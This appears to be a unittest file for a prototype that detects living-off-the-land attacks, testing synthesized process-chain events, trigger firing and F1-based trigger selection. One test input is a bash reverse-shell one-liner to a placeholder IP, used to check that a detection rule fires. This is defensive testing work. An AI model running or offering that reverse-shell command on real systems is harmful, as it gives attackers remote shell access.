"""cd ai && uv run python -m unittest tests/test_prototype.py"""

import unittest

import numpy as np

from lotl.chains import iter_snapshots, synthesize
from lotl.prototype import TRIGGERS, select_triggers

FIRES = dict(TRIGGERS)


class PrototypeTest(unittest.TestCase):
    def test_synthesize_and_snapshots(self):
        events = synthesize({"chain": ["systemd", "nginx", "sh"], "cmdline": "sh -c id"})
        snaps = list(iter_snapshots(events))
        self.assertEqual([(p, k) for p, _, _, k in snaps],
                         [(1, "ProcessStart"), (2, "ProcessStart"), (3, "ProcessStart"), (3, "ProcessExec")])
        self.assertEqual(snaps[-1][1:3], (["systemd", "nginx", "sh"], "sh -c id"))

    def test_synthesize_windows_has_no_exec(self):
        events = synthesize({"os": "windows", "chain": ["explorer", "winword", "cmd"], "cmdline": "cmd.exe /c whoami"})
        snaps = list(iter_snapshots(events))
        self.assertEqual([(p, k) for p, _, _, k in snaps], [(1, "ProcessStart"), (2, "ProcessStart"), (3, "ProcessStart")])
        self.assertEqual(snaps[-1][1:3], (["explorer", "winword", "cmd"], "cmd.exe /c whoami"))

    def test_trigger_firing(self):
        def snap(chain, cmdline="x", kind="ProcessStart"):
            return {"pid": 1, "chain": chain, "cmdline": cmdline, "kind": kind}
        self.assertTrue(FIRES["interp_child"](snap(["bash", "bash"])))
        self.assertFalse(FIRES["interp_child"](snap(["nginx", "sh"])))
        self.assertTrue(FIRES["rule_hit"](snap(["bash"], "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")))
        self.assertFalse(FIRES["rule_hit"](snap(["ls"], "ls -la")))

    def test_select_triggers(self):
        labels = np.array([1, 1, 0, 0])
        # Each trigger alone catches one attack (F1 0.667); together they catch both.
        sel = select_triggers(np.array([[1, 0], [0, 1], [0, 0], [0, 0]]), labels, 0.9)
        self.assertEqual((sel["subset"], sel["f1"], sel["reached_threshold"]), ([0, 1], 1.0, True))
        # Unreachable: fall back to the smallest subset with the best F1 (trigger 1 alone, 0.667).
        sel = select_triggers(np.array([[1, 1], [0, 1], [1, 1], [0, 1]]), labels, 0.9)
        self.assertEqual((sel["subset"], sel["reached_threshold"]), ([1], False))
        self.assertAlmostEqual(sel["f1"], 2 / 3)


if __name__ == "__main__":
    unittest.main()
